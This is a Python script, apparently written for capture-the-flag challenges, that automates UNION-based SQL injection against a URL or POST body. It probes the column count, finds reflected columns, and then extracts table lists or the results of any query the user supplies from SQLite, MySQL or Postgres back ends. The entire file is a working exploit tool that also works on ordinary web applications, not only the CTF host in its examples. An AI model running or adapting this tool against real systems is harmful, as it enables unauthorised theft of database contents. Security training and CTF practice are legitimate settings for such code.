#!/usr/bin/env python3
"""UNION-based SQLi helper. URL (or --data) has {} at the injection point.

1. finds the column count (ORDER BY / UNION NULL),
2. finds which columns are reflected,
3. runs your --query (scalar expression/subquery) in a reflected column,
   or lists tables with --tables.

    python union_dump.py "http://sqli3.chal.deti:8032/photo/{}" --tables --dbms sqlite
    python union_dump.py "http://sqli3.chal.deti:8032/photo/{}" --query "SELECT secret FROM vault" --dbms sqlite
    python union_dump.py "http://t/item?id={}" --prefix "0" --dbms mysql --query "SELECT group_concat(secret) FROM vault"
    python union_dump.py "http://t/search?q={}" --prefix "zzz'" --comment "-- -" --cols 3 --tables
"""
import argparse
import html
import re
from urllib.parse import quote

import requests

FLAG = re.compile(r"flag\{[^}]+\}")
TABLES = {
    "sqlite": "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
    "mysql": "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
    "postgres": "SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data", help="POST body with {}")
    ap.add_argument("--prefix", default="0", help="value before UNION that returns no rows (0, -1, zzz')")
    ap.add_argument("--comment", default="--")
    ap.add_argument("--cols", type=int)
    ap.add_argument("--dbms", default="sqlite", choices=list(TABLES))
    ap.add_argument("--tables", action="store_true")
    ap.add_argument("--query")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def send(inj):
        q = quote(inj, safe="")
        if a.data:
            r = requests.post(a.url, data=a.data.replace("{}", q), timeout=20,
                              headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = requests.get(a.url.replace("{}", q), headers=hdr, timeout=20)
        return r.status_code, html.unescape(r.text)

    p, cm = a.prefix, a.comment
    n = a.cols
    if not n:
        for i in range(1, 21):
            st, body = send(f"{p} UNION SELECT {','.join(['NULL'] * i)}{cm}")
            if st == 200 and not re.search(r"error|different number|columns", body, re.I):
                n = i
                break
        if not n:
            raise SystemExit("could not determine column count; pass --cols and check --prefix/--comment")
    print(f"[+] columns: {n}")
    markers = [f"'zq{i}qz'" for i in range(n)]
    st, body = send(f"{p} UNION SELECT {','.join(markers)}{cm}")
    shown = [i for i in range(n) if f"zq{i}qz" in body]
    print(f"[+] reflected columns (0-based): {shown}")
    if not shown:
        raise SystemExit("no reflected column (types? try --dbms postgres with NULLs) ")
    col = shown[0]
    q = TABLES[a.dbms] if a.tables else a.query
    if not q:
        return
    cols = ["NULL"] * n
    cols[col] = f"({q})"
    st, body = send(f"{p} UNION SELECT {','.join(cols)}{cm}")
    m = re.search(r"zq\d+qz", body)
    print(f"[{st}] result page {len(body)}B")
    fl = FLAG.findall(body)
    if fl:
        print("[FLAG]", *fl)
    # show the text around where the marker column normally appears
    cols2 = list(cols)
    cols2[col] = f"'<<<'||({q})||'>>>'" if a.dbms != "mysql" else f"CONCAT('<<<',({q}),'>>>')"
    st, body = send(f"{p} UNION SELECT {','.join(cols2)}{cm}")
    for hit in re.findall(r"<<<(.*?)>>>", body, re.S):
        print("[result]", hit)


if __name__ == "__main__":
    main()
